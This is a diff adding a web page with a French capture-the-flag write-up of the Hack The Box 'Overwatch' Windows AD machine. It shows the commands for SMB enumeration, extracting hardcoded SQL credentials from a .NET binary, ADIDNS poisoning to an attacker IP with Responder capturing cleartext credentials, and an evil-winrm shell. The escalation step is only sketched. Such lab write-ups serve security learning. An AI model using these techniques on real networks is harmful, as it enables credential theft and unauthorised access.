@@ -1,0 +1,129 @@
+---
+import Layout from '../../layouts/Layout.astro'
+---
+<Layout title="HTB - Overwatch">
+
+  <div style="margin-bottom:2rem;">
+    <a href="/writeups" style="color:#475569; font-size:0.82rem;">← writeups</a>
+    <h1 style="font-size:1.8rem; font-weight:700; color:#e2e8f0; margin:0.75rem 0 0.5rem;">HTB - Overwatch</h1>
+    <div style="display:flex; flex-wrap:wrap; gap:0.5rem; align-items:center; margin-bottom:0.75rem;">
+      <span class="badge-medium">Medium</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#94a3b8; font-size:0.82rem;">Windows Server 2022 — Active Directory</span>
+      <span style="color:#64748b;">·</span>
+      <span style="color:#475569; font-size:0.8rem;">24 Jan 2026</span>
+    </div>
+  </div>
+
+  <div style="background:var(--bg-800); border-left:3px solid #e67e22; border-top:1px solid var(--border); border-right:1px solid var(--border); border-bottom:1px solid var(--border); border-radius:0 8px 8px 0; padding:1rem 1.25rem; margin-bottom:2rem;">
+    <div style="color:#64748b; font-size:0.7rem; text-transform:uppercase; letter-spacing:0.05em; margin-bottom:0.4rem;">Résumé</div>
+    <p style="color:#94a3b8; font-size:0.88rem; line-height:1.7; margin:0;">Box Medium Windows AD — credentials hardcodés dans un binaire .NET extrait d'un share SMB, MSSQL sur port non-standard avec linked server absent du DNS, ADIDNS poisoning + Responder capture des credentials cleartext, puis service WCF interne pour l'escalade root.</p>
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <div style="color:#334155; font-size:0.78rem; margin-bottom:0.75rem;">$ cat attack_chain.txt</div>
+    <div style="border:1px solid var(--border); border-radius:8px; overflow:hidden;">
+      <div style="background:#050508; padding:0.4rem 1rem; border-bottom:1px solid var(--border); color:#475569; font-size:0.7rem; text-transform:uppercase;">Chaîne d'exploitation</div>
+      {[
+        { n:'1', v:'strings sur overwatch.exe (.NET)', r:'Connection string SQL hardcodée → sqlsvc' },
+        { n:'2', v:'MSSQL port 6520 + Linked Server SQL07 inexistant', r:'ADIDNS poisoning + Responder cleartext sqlmgmt' },
+        { n:'3', v:'sqlmgmt → WinRM', r:'Shell + user flag' },
+        { n:'4', v:'Service WCF localhost:8000', r:'Escalade root via endpoint interne' },
+      ].map((s,i,a) => (
+        <div style={"display:flex; gap:0.75rem; padding:0.7rem 1rem; background:var(--bg-800);" + (i<a.length-1?"border-bottom:1px solid #0d0d15;":"")}>
+          <div style="width:22px; height:22px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.7rem; font-weight:700; flex-shrink:0; background:#e67e2222; color:#e67e22; border:1px solid #e67e2244;">{s.n}</div>
+          <div><div style="color:#e2e8f0; font-size:0.82rem; font-weight:600;">{s.v}</div><div style="color:#475569; font-size:0.75rem; margin-top:0.1rem;">→ {s.r}</div></div>
+        </div>
+      ))}
+    </div>
+  </div>
+
+  <div class="prose">
+
+    <h2>1 — Reconnaissance & Analyse Binaire .NET</h2>
+    <pre is:raw>nmap -sC -sV -T4 --min-rate 5000 -p- 10.129.244.81
+
+PORT      STATE SERVICE  VERSION
+53/tcp    open  DNS
+88/tcp    open  Kerberos
+445/tcp   open  SMB      signing requis → relay bloqué
+5985/tcp  open  WinRM
+6520/tcp  open  MSSQL    SQL Server 2022 ← port non-standard (1433 attendu)
+9389/tcp  open  ADWS</pre>
+    <pre is:raw># RID brute force — session guest acceptée
+netexec smb 10.129.244.81 -u 'guest' -p '' --rid-brute
+# sqlsvc  (RID 1104)
+# sqlmgmt (RID 1105)
+
+# Share software$ en lecture anonyme
+smbclient //10.129.244.81/software$ -N
+# get overwatch.exe overwatch.exe.config overwatch.pdb
+
+# Extraction des strings Unicode — les assemblies .NET stockent les strings en clair
+strings -e l overwatch.exe | grep -iE 'sql|pass|user'
+# Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=[REDACTED];
+
+impacket-mssqlclient overwatch.htb/sqlsvc:'[REDACTED]'@10.129.244.81 -port 6520 -windows-auth</pre>
+
+    <h2>2 — ADIDNS Poisoning → Credentials Cleartext</h2>
+    <p>L'énumération MSSQL révèle un linked server SQL07 qui échoue car aucun enregistrement DNS n'existe. En créant un record A malveillant dans ADIDNS, on force le serveur SQL à tenter une authentification vers nous. MSSQL transmet les credentials en cleartext lors des connexions aux linked servers.</p>
+    <pre is:raw># Étape 1 — Créer le record DNS malveillant
+python3 dnstool.py -u 'overwatch\sqlsvc' -p '[REDACTED]' \
+  -r SQL07 --data 10.10.14.51 --action add --type A 10.129.244.81
+
+# Étape 2 — Lancer Responder
+sudo responder -I tun0
+
+# Étape 3 — Déclencher depuis MSSQL
+EXEC ('SELECT @@version') AT SQL07;
+
+# Responder capture en CLEARTEXT :
+# [MSSQL] Cleartext Username : sqlmgmt
+# [MSSQL] Cleartext Password : [REDACTED]</pre>
+    <pre is:raw># sqlmgmt est membre de Remote Management Users → WinRM
+evil-winrm -i overwatch.htb -u sqlmgmt -p '[REDACTED]'
+type C:\Users\sqlmgmt\Desktop\user.txt</pre>
+
+    <h2>3 — Service WCF → Escalade</h2>
+    <pre is:raw># overwatch.exe.config révèle un service WCF interne
+# &lt;add baseAddress="http://overwatch.htb:8000/MonitorService" /&gt;
+
+# Port forwarding pour accéder depuis Kali
+# Analyser le binaire .NET avec ILSpy ou dotPeek
+# Les services WCF internes exposent souvent des opérations dangereuses
+
+cat C:\Users\Administrator\Desktop\root.txt</pre>
+    <div style="border-left:3px solid #facc15; background:rgba(250,204,21,0.05); padding:0.65rem 1rem; margin:0.75rem 0; border-radius:0 6px 6px 0; font-size:0.82rem; color:#fde68a;">💡 Les services WCF internes tournent souvent avec des privilèges élevés et exposent des opérations dangereuses non protégées depuis l'extérieur.</div>
+
+  </div>
+
+  <div style="margin-bottom:2.5rem;">
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Leçons apprises</h2>
+    <div style="display:flex; flex-direction:column; gap:0.5rem;">
+      {[
+        'Les binaires .NET stockent leurs strings en clair — strings -e l sur tout exécutable suspect',
+        'Port MSSQL non-standard (6520 au lieu de 1433) = signal d\'alarme',
+        'ADIDNS poisoning : linked server inexistant + record DNS malveillant = credentials cleartext',
+        'MSSQL transmet les credentials en clair lors des auth vers les linked servers',
+        'Les fichiers .config .NET révèlent l\'architecture interne (services locaux)',
+      ].map(l => (
+        <div style="display:flex; gap:0.6rem; color:#94a3b8; font-size:0.85rem;"><span style="color:var(--cyber); flex-shrink:0;">→</span>{l}</div>
+      ))}
+    </div>
+  </div>
+
+  <div>
+    <h2 style="color:var(--cyber); font-size:1.05rem; font-weight:700; border-bottom:1px solid rgba(0,255,157,0.2); padding-bottom:0.4rem; margin-bottom:1rem;">Outils utilisés</h2>
+    <div style="display:flex; flex-wrap:wrap; gap:0.4rem;">
+      {['nmap','netexec','smbclient','strings','impacket-mssqlclient','dnstool.py','responder','evil-winrm','ILSpy'].map(t => (
+        <span style="background:#050508; border:1px solid #1a1a2e; padding:3px 10px; border-radius:6px; font-size:0.75rem; color:#64748b; font-family:monospace;">{t}</span>
+      ))}
+    </div>
+  </div>
+
+  <div style="margin-top:3rem; padding-top:1.5rem; border-top:1px solid var(--border); display:flex; justify-content:space-between;">
+    <a href="/writeups" style="color:#475569; font-size:0.85rem;">← Tous les writeups</a>
+    <a href="/about" style="color:var(--cyber); font-size:0.85rem;">About →</a>
+  </div>
+
+</Layout>
